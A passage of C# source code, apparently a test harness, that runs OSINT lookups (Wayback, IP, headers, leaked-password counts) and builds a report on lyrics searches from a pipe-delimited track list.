            await Step("wayback", async () => { var a = await Osint.Wayback("github.com"); return $"{a.First} … {a.Last} · {a.Count}"; });
            await Step("ip", async () => T(await Osint.Ip("1.1.1.1")));
            await Step("headers", async () => T(await Osint.Headers("github.com")));
            await Step("pwned", async () => $"'password123' найден {await Osint.PasswordLeaks("password123")} раз; случайный — {await Osint.PasswordLeaks(Guid.NewGuid().ToString())}");
            File.WriteAllText(output, sb.ToString(), new UTF8Encoding(true));
            return 0;
        }

        static async Task<int> Lyrics(string input, string output)
        {
            var sb = new StringBuilder();
            int found = 0, synced = 0, total = 0;
            foreach (var raw in File.ReadAllLines(input))
            {
                if (string.IsNullOrWhiteSpace(raw) || raw.StartsWith("#")) continue;
                var p = raw.Split('|');
                string title = p[0], artist = p.Length > 1 ? p[1] : "", album = p.Length > 2 ? p[2] : "";
                double dur = p.Length > 3 && double.TryParse(p[3], System.Globalization.NumberStyles.Float, System.Globalization.CultureInfo.InvariantCulture, out var d) ? d : 0;
                bool browser = p.Length > 4 && p[4] == "1";
                total++;
                var sw = Stopwatch.StartNew();
                var r = await LyricsService.Fresh(title, artist, album, dur, browser);
                sw.Stop();
                sb.AppendLine($"## {artist} — {title}  (dur {dur}, browser {browser})");
                sb.AppendLine("   query: " + LyricsService.DescribeQuery(title, artist, browser));
                if (r == null || r.Lines == null) { sb.AppendLine($"   NOT FOUND  ({sw.ElapsedMilliseconds} ms)"); continue; }
                found++;
                if (r.Synced) synced++;
                var real = r.Lines.Where(l => l.Text != "♪").ToList();
                sb.AppendLine($"   {r.Source} · synced {r.Synced} · words {r.HasWords} · instrumental {r.Instrumental} · lines {real.Count} · lrcDur {r.Duration:0.#} · {sw.ElapsedMilliseconds} ms");
                foreach (var l in real.Take(3)) sb.AppendLine($"     [{l.Time:mm\\:ss\\.ff}] {l.Text}");
            }
            sb.Insert(0, $"total {total} · found {found} · synced {synced}\n\n");
            File.WriteAllText(output, sb.ToString(), new UTF8Encoding(true));
            return 0;
        }
    }
}
